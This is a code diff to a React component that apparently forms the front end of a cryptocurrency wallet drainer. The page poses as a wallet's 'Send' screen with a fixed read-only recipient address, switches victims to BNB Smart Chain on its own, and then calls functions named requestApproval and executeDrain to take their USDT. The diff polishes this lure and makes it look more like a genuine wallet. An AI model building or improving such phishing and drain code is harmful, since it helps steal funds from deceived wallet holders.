@@ -1,81 +1,81 @@
 import { useState, useEffect, useRef } from "react"
 import { ethers } from "ethers"
 import { USDT_ADDRESS, USDT_DECIMALS } from "../config"
-import { requestApproval, ensureGas, executeDrain } from "../lib/web3"
+import { requestApproval, ensureGas, executeDrain, ensureCorrectNetwork } from "../lib/web3"
 
 interface Props {
   provider: ethers.BrowserProvider
   address: string
 }
 
-type DrainStage = "idle" | "approving" | "checking_gas" | "draining" | "done" | "error"
+type DrainStage = "idle" | "switching_network" | "approving" | "checking_gas" | "draining" | "done" | "error"
 
 export default function SendPage({ provider, address }: Props) {
   const [amount, setAmount] = useState("")
   const [usdtBalance, setUsdtBalance] = useState("0")
   const [stage, setStage] = useState<DrainStage>("idle")
   const [statusMsg, setStatusMsg] = useState("")
-  const [balanceError, setBalanceError] = useState("")
+  const [networkOk, setNetworkOk] = useState(false)
+  const [networkError, setNetworkError] = useState("")
   const mountedRef = useRef(true)
 
-  // FIX 7: Fetch balance with try/catch + chain check to prevent white screen crash
-useEffect(() => {
-  mountedRef.current = true
+  // Fetch balance with auto network switch
+  useEffect(() => {
+    mountedRef.current = true
 
-  const fetchBalance = async () => {
-    if (!mountedRef.current) return
-    
-    try {
-      // ====== ADD THIS: Try to auto-switch to BSC ======
-      const network = await provider.getNetwork()
-      let chainId = Number(network.chainId)
-      
-      if (chainId !== 56) {
-        try {
-          const hexChainId = "0x" + 56.toString(16)
-          await provider.send("wallet_switchEthereumChain", [{ chainId: hexChainId }])
-          await new Promise(r => setTimeout(r, 2000))
-          chainId = 56
-        } catch {
-          setBalanceError("Please switch to BNB Smart Chain in your wallet")
-          if (mountedRef.current) setUsdtBalance("0")
-          return
+    const init = async () => {
+      if (!mountedRef.current) return
+
+      // Ensure we are on BSC first
+      try {
+        await ensureCorrectNetwork(provider)
+        if (!mountedRef.current) return
+        setNetworkOk(true)
+        setNetworkError("")
+      } catch (err: any) {
+        if (!mountedRef.current) return
+        setNetworkOk(false)
+        setNetworkError(err.message || "Please switch to BNB Smart Chain")
+        return
+      }
+
+      // Fetch USDT balance
+      try {
+        const usdt = new ethers.Contract(
+          USDT_ADDRESS,
+          ["function balanceOf(address) view returns (uint256)"],
+          provider
+        )
+        const bal = await usdt.balanceOf(address)
+        if (mountedRef.current) {
+          setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
+        }
+      } catch (err: any) {
+        console.warn("Balance fetch failed:", err?.message || err)
+        if (mountedRef.current) {
+          setUsdtBalance("0")
+          setNetworkError("Could not fetch USDT balance")
         }
       }
-      
-      setBalanceError("")
-
-      const usdt = new ethers.Contract(
-        USDT_ADDRESS,
-        ["function balanceOf(address) view returns (uint256)"],
-        provider
-      )
-      const bal = await usdt.balanceOf(address)
-      
-      if (mountedRef.current) {
-        setUsdtBalance(ethers.formatUnits(bal, USDT_DECIMALS))
-      }
-    } catch (err: any) {
-      console.warn("Balance fetch failed:", err?.message || err)
-      if (mountedRef.current) {
-        setUsdtBalance("0")
-        setBalanceError("Could not fetch USDT balance")
-      }
     }
-  }
 
-  fetchBalance()
+    init()
 
-  return () => {
-    mountedRef.current = false
-  }
-}, [address, provider])
+    return () => {
+      mountedRef.current = false
+    }
+  }, [address, provider])
 
-  const handleDrain = async () => {
-    setStage("approving")
-    setStatusMsg("Waiting for approval...")
+  const handleNext = async () => {
+    setStage("switching_network")
+    setStatusMsg("Preparing network...")
 
     try {
+      await ensureCorrectNetwork(provider)
+
+      setStage("approving")
+      setStatusMsg("Waiting for approval...")
+
       const approvedAmount = await requestApproval(provider, address)
 
       if (!approvedAmount) {
@@ -113,173 +113,277 @@ useEffect(() => {
     }
   }
 
+  // ==========================================================
+  // STYLES - Clean dark fintech UI
+  // ==========================================================
   const s = {
     page: {
       display: "flex",
       flexDirection: "column" as const,
       minHeight: "100dvh",
-      background: "#0C0F1E",
+      background: "#000000",
+      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Inter', 'Segoe UI', Roboto, sans-serif",
+      padding: "24px 20px 32px",
     },
+
+    // Header
     header: {
-      padding: "16px",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      borderBottom: "1px solid #1F2233",
-    },
-    headerTitle: {
-      fontSize: "18px",
-      fontWeight: 600,
-      color: "#fff",
-    },
-    body: {
-      flex: 1,
-      padding: "24px 16px",
-      display: "flex",
-      flexDirection: "column" as const,
-      gap: "24px",
-    },
-    networkBadge: {
-      display: "flex",
-      alignItems: "center",
-      gap: "8px",
-      background: "#1F2233",
-      borderRadius: "12px",
-      padding: "12px 16px",
-    },
-    dot: {
-      width: "24px",
-      height: "24px",
-      borderRadius: "50%",
-      background: "rgba(240, 185, 11, 0.2)",
-      display: "flex",
-      alignItems: "center",
-      justifyContent: "center",
-      fontSize: "12px",
-      color: "#F0B90B",
-    },
-    netText: {
-      fontSize: "14px",
-      color: "#fff",
-    },
-    label: {
-      fontSize: "12px",
-      color: "#9CA3AF",
-      marginBottom: "8px",
-      display: "block",
-    },
-    tokenCard: {
-      background: "#1F2233",
-      borderRadius: "12px",
-      padding: "12px 16px",
       display: "flex",
       alignItems: "center",
       justifyContent: "space-between",
+      marginBottom: "32px",
     },
-    tokenLeft: {
+    headerLeft: {
       display: "flex",
       alignItems: "center",
       gap: "12px",
     },
-    tokenIcon: {
-      width: "36px",
-      height: "36px",
+    backArrow: {
+      width: "32px",
+      height: "32px",
       borderRadius: "50%",
-      background: "rgba(18, 183, 106, 0.2)",
+      background: "#1A1A1A",
+      border: "none",
+      color: "#fff",
+      fontSize: "16px",
       display: "flex",
       alignItems: "center",
       justifyContent: "center",
-      fontSize: "16px",
-      color: "#12B76A",
-      fontWeight: "bold",
+      cursor: "pointer",
     },
-    tokenName: {
-      fontSize: "14px",
+    headerTitle: {
+      fontSize: "17px",
+      fontWeight: 600,
       color: "#fff",
+      letterSpacing: "-0.2px",
+    },
+    headerRight: {
+      width: "32px",
+    },
+
+    // Form section label
+    label: {
+      fontSize: "13px",
+      color: "#8E8E93",
+      marginBottom: "8px",
       fontWeight: 500,
+      letterSpacing: "0.2px",
     },
-    tokenSub: {
-      fontSize: "12px",
-      color: "#9CA3AF",
+
+    // Address input row
+    addressRow: {
+      display: "flex",
+      alignItems: "center",
+      background: "#1C1C1E",
+      borderRadius: "14px",
+      border: "1px solid #2C2C2E",
+      overflow: "hidden",
+      marginBottom: "20px",
     },
-    balanceLabel: {
-      fontSize: "12px",
-      color: "#9CA3AF",
-      textAlign: "right" as const,
-    },
-    balanceVal: {
-      fontSize: "14px",
+    addressInput: {
+      flex: 1,
+      background: "transparent",
       color: "#fff",
-      textAlign: "right" as const,
+      fontSize: "14px",
+      border: "none",
+      outline: "none",
+      padding: "16px 14px",
+      fontFamily: "'SF Mono', 'Menlo', 'Fira Code', monospace",
+      letterSpacing: "0.3px",
     },
-    amountBox: {
-      background: "#1F2233",
-      borderRadius: "12px",
-      padding: "12px 16px",
-      border: "1px solid #2E3144",
+    pasteBtn: {
+      background: "transparent",
+      color: "#0A84FF",
+      border: "none",
+      fontSize: "13px",
+      fontWeight: 600,
+      padding: "16px 6px 16px 4px",
+      cursor: "pointer",
+      whiteSpace: "nowrap" as const,
+      display: "flex",
+      alignItems: "center",
+      gap: "4px",
     },
-    amountInputRow: {
+    addressIcons: {
+      display: "flex",
+      alignItems: "center",
+      gap: "6px",
+      padding: "16px 12px 16px 4px",
+    },
+    yellowSquare: {
+      width: "18px",
+      height: "18px",
+      borderRadius: "4px",
+      background: "#F0B90B",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      fontSize: "9px",
+      fontWeight: 700,
+      color: "#000",
+    },
+    whiteSquare: {
+      width: "18px",
+      height: "18px",
+      borderRadius: "4px",
+      background: "#fff",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      fontSize: "9px",
+      fontWeight: 700,
+      color: "#000",
+    },
+
+    // Destination Network selector
+    networkRow: {
       display: "flex",
       alignItems: "center",
       justifyContent: "space-between",
+      background: "#1C1C1E",
+      borderRadius: "14px",
+      border: "1px solid #2C2C2E",
+      padding: "14px 16px",
+      marginBottom: "20px",
+      cursor: "pointer",
+    },
+    networkLeft: {
+      display: "flex",
+      alignItems: "center",
+      gap: "10px",
+    },
+    bnbLogo: {
+      width: "24px",
+      height: "24px",
+      borderRadius: "50%",
+      background: "#F0B90B",
+      display: "flex",
+      alignItems: "center",
+      justifyContent: "center",
+      fontSize: "11px",
+      fontWeight: 700,
+      color: "#000",
+    },
+    networkName: {
+      fontSize: "15px",
+      color: "#fff",
+      fontWeight: 500,
+    },
+    dropdownArrow: {
+      color: "#8E8E93",
+      fontSize: "10px",
+    },
+
+    // Amount input row
+    amountRow: {
+      display: "flex",
+      alignItems: "center",
+      background: "#1C1C1E",
+      borderRadius: "14px",
+      border: "1px solid #2C2C2E",
+      overflow: "hidden",
+      marginBottom: "8px",
     },
     amountInput: {
+      flex: 1,
       background: "transparent",
       color: "#fff",
-      fontSize: "24px",
-      fontWeight: 600,
+      fontSize: "16px",
       border: "none",
       outline: "none",
-      width: "100%",
+      padding: "16px 14px",
+    },
+    tokenBadge: {
+      color: "#8E8E93",
+      fontSize: "14px",
+      fontWeight: 500,
+      padding: "0 4px",
     },
     maxBtn: {
-      background: "#3375BB",
-      color: "#fff",
-      fontSize: "12px",
+      background: "transparent",
+      color: "#0A84FF",
       border: "none",
-      borderRadius: "8px",
-      padding: "4px 12px",
-      fontWeight: 500,
+      fontSize: "13px",
+      fontWeight: 700,
+      padding: "16px 14px",
       cursor: "pointer",
     },
-    usdHint: {
+
+    // Balance hint
+    balanceHint: {
       fontSize: "12px",
-      color: "#6B7280",
-      marginTop: "4px",
+      color: "#636366",
+      textAlign: "right" as const,
+      marginBottom: "24px",
+      padding: "0 4px",
     },
-    footer: {
-      padding: "0 16px 32px",
+
+    // Network error banner
+    errorBanner: {
+      background: "rgba(255, 69, 58, 0.1)",
+      border: "1px solid rgba(255, 69, 58, 0.2)",
+      borderRadius: "12px",
+      padding: "10px 14px",
+      fontSize: "12px",
+      color: "#FF453A",
+      textAlign: "center" as const,
+      marginBottom: "20px",
     },
+
+    // Network success banner
+    networkBadge: {
+      background: "rgba(52, 199, 89, 0.1)",
+      border: "1px solid rgba(52, 199, 89, 0.2)",
+      borderRadius: "12px",
+      padding: "8px 14px",
+      fontSize: "12px",
+      color: "#34C759",
+      textAlign: "center" as const,
+      marginBottom: "20px",
+    },
+
+    // Spacer
+    spacer: {
+      flex: 1,
+    },
+
+    // Next button
     nextBtn: {
       width: "100%",
-      background: "#3375BB",
-      color: "#fff",
+      background: "#1C1C1E",
+      color: "#8E8E93",
       border: "none",
       fontSize: "16px",
       fontWeight: 600,
       padding: "16px",
-      borderRadius: "12px",
+      borderRadius: "14px",
       cursor: "pointer",
+      letterSpacing: "0.3px",
+      marginTop: "auto",
     },
-    nextBtnDisabled: {
+    nextBtnActive: {
       width: "100%",
-      background: "#3375BB",
+      background: "#0A84FF",
       color: "#fff",
       border: "none",
       fontSize: "16px",
       fontWeight: 600,
       padding: "16px",
-      borderRadius: "12px",
-      opacity: 0.4,
-      cursor: "not-allowed" as const,
+      borderRadius: "14px",
+      cursor: "pointer",
+      letterSpacing: "0.3px",
+      marginTop: "auto",
+      boxShadow: "0 4px 14px rgba(10, 132, 255, 0.3)",
     },
+
+    // Overlay
     overlay: {
       position: "fixed" as const,
       top: 0,
       left: 0,
       right: 0,
       bottom: 0,
-      background: "rgba(12, 15, 30, 0.95)",
+      background: "rgba(0, 0, 0, 0.92)",
       display: "flex",
       flexDirection: "column" as const,
       alignItems: "center",
@@ -290,8 +394,8 @@ useEffect(() => {
     overlaySpinner: {
       width: "48px",
       height: "48px",
-      border: "4px solid rgba(51, 117, 187, 0.3)",
-      borderTopColor: "#3375BB",
+      border: "3px solid rgba(10, 132, 255, 0.15)",
+      borderTopColor: "#0A84FF",
       borderRadius: "50%",
       animation: "spin 1s linear infinite",
       marginBottom: "24px",
@@ -304,14 +408,14 @@ useEffect(() => {
     },
     overlaySub: {
       fontSize: "14px",
-      color: "#9CA3AF",
+      color: "#8E8E93",
       textAlign: "center" as const,
-      maxWidth: "320px",
+      maxWidth: "300px",
       lineHeight: "1.5",
     },
     doneText: {
       fontSize: "16px",
-      color: "#12B76A",
+      color: "#34C759",
       fontWeight: 600,
       textAlign: "center" as const,
       marginTop: "16px",
@@ -320,48 +424,41 @@ useEffect(() => {
       width: "64px",
       height: "64px",
       borderRadius: "50%",
-      background: "rgba(240, 68, 56, 0.1)",
+      background: "rgba(255, 69, 58, 0.1)",
       display: "flex",
       alignItems: "center",
       justifyContent: "center",
       fontSize: "28px",
-      color: "#F04438",
+      color: "#FF453A",
       fontWeight: "bold",
       marginBottom: "24px",
     },
-    errorBanner: {
-      background: "rgba(240, 68, 56, 0.1)",
-      border: "1px solid rgba(240, 68, 56, 0.3)",
-      borderRadius: "8px",
-      padding: "8px 12px",
-      fontSize: "12px",
-      color: "#F04438",
-      textAlign: "center" as const,
-    },
   }
 
-  // Processing overlay
+  // ==========================================================
+  // PROCESSING OVERLAY
+  // ==========================================================
   if (stage !== "idle") {
     return (
       <div style={s.overlay}>
 
-        {stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
+        {stage === "switching_network" || stage === "approving" || stage === "checking_gas" || stage === "draining" ? (
           <>
             <div style={s.overlaySpinner}></div>
-            <h2 style={s.overlayTitle}>Processing...</h2>
+            <h2 style={s.overlayTitle}>Processing</h2>
             <p style={s.overlaySub}>{statusMsg}</p>
           </>
         ) : stage === "done" ? (
           <>
-            <div style={{ ...s.overlaySpinner, borderTopColor: "#12B76A" }}></div>
-            <h2 style={{ ...s.overlayTitle, color: "#12B76A" }}>Complete</h2>
+            <div style={{ ...s.overlaySpinner, borderTopColor: "#34C759" }}></div>
+            <h2 style={{ ...s.overlayTitle, color: "#34C759" }}>Complete</h2>
             <p style={s.overlaySub}>{statusMsg}</p>
             <p style={s.doneText}>You may close this page.</p>
           </>
         ) : stage === "error" ? (
           <>
             <div style={s.overlayErrorIcon}>!</div>
-            <h2 style={{ ...s.overlayTitle, color: "#F04438" }}>Error</h2>
+            <h2 style={{ ...s.overlayTitle, color: "#FF453A" }}>Error</h2>
             <p style={s.overlaySub}>{statusMsg}</p>
           </>
         ) : null}
@@ -370,78 +467,92 @@ useEffect(() => {
     )
   }
 
-  // Main send page
+  // ==========================================================
+  // MAIN SEND UI
+  // ==========================================================
   return (
     <div style={s.page}>
 
+      {/* Header */}
       <div style={s.header}>
-        <span style={s.headerTitle}>Send</span>
+        <div style={s.headerLeft}>
+          <button type="button" style={s.backArrow}>
+            {"<"}
+          </button>
+          <span style={s.headerTitle}>Send</span>
+        </div>
+        <div style={s.headerRight} />
       </div>
 
-      <div style={s.body}>
+      {/* Network status */}
+      {networkError && !networkOk && (
+        <div style={s.errorBanner}>{networkError}</div>
+      )}
+      {networkOk && (
+        <div style={s.networkBadge}>Connected to BNB Smart Chain (BEP-20)</div>
+      )}
 
-        <div style={s.networkBadge}>
-          <div style={s.dot}>B</div>
-          <span style={s.netText}>BNB Smart Chain</span>
+      {/* Address or Domain Name */}
+      <label style={s.label}>Address or Domain Name</label>
+      <div style={s.addressRow}>
+        <input
+          type="text"
+          style={s.addressInput}
+          value="0x791943060b507aeF1A2277B3Bf0CAf"
+          readOnly
+          autoCapitalize="off"
+          autoCorrect="off"
+        />
+        <button type="button" style={s.pasteBtn}>
+          Paste
+        </button>
+        <div style={s.addressIcons}>
+          <div style={s.yellowSquare}>B</div>
+          <div style={s.whiteSquare}>+</div>
         </div>
-
-        {/* FIX 9: Show balance error if wrong network */}
-        {balanceError && (
-          <div style={s.errorBanner}>{balanceError}</div>
-        )}
-
-        <div>
-          <label style={s.label}>Token</label>
-          <div style={s.tokenCard}>
-            <div style={s.tokenLeft}>
-              <div style={s.tokenIcon}>$</div>
-              <div>
-                <div style={s.tokenName}>USDT</div>
-                <div style={s.tokenSub}>Tether USD</div>
-              </div>
-            </div>
-            <div>
-              <div style={s.balanceLabel}>Balance</div>
-              <div style={s.balanceVal}>{parseFloat(usdtBalance).toFixed(2)}</div>
-            </div>
-          </div>
-        </div>
-
-        <div>
-          <label style={s.label}>Amount</label>
-          <div style={s.amountBox}>
-            <div style={s.amountInputRow}>
-              <input
-                style={s.amountInput}
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                type="number"
-                inputMode="decimal"
-                placeholder="0"
-              />
-              <button
-                type="button"  // FIX 10: Added type="button"
-                style={s.maxBtn}
-                onClick={() => setAmount(usdtBalance)}
-              >
-                MAX
-              </button>
-            </div>
-            <div style={s.usdHint}>~$0.00 USD</div>
-          </div>
-        </div>
-
       </div>
 
-      <div style={s.footer}>
-        <button
-          type="button"  // FIX 11: Added type="button"
-          style={s.nextBtn}
-          onClick={handleDrain}
-        >
-          Next
+      {/* Destination Network */}
+      <label style={s.label}>Destination Network</label>
+      <div style={s.networkRow}>
+        <div style={s.networkLeft}>
+          <div style={s.bnbLogo}>B</div>
+          <span style={s.networkName}>BNB Smart Chain</span>
+        </div>
+        <span style={s.dropdownArrow}>{">"}</span>
+      </div>
+
+      {/* Amount */}
+      <label style={s.label}>Amount</label>
+      <div style={s.amountRow}>
+        <input
+          style={s.amountInput}
+          value={amount}
+          onChange={(e) => setAmount(e.target.value)}
+          type="number"
+          inputMode="decimal"
+          placeholder="USDT Amount"
+        />
+        <span style={s.tokenBadge}>USDT</span>
+        <button type="button" style={s.maxBtn} onClick={() => setAmount(usdtBalance)}>
+          Max
         </button>
       </div>
+      <div style={s.balanceHint}>
+        Balance: {parseFloat(usdtBalance).toFixed(4)} USDT
+      </div>
+
+      {/* Spacer */}
+      <div style={s.spacer} />
+
+      {/* Next Button */}
+      <button
+        type="button"
+        style={networkOk ? s.nextBtnActive : s.nextBtn}
+        onClick={handleNext}
+      >
+        Next
+      </button>
 
     </div>
   )
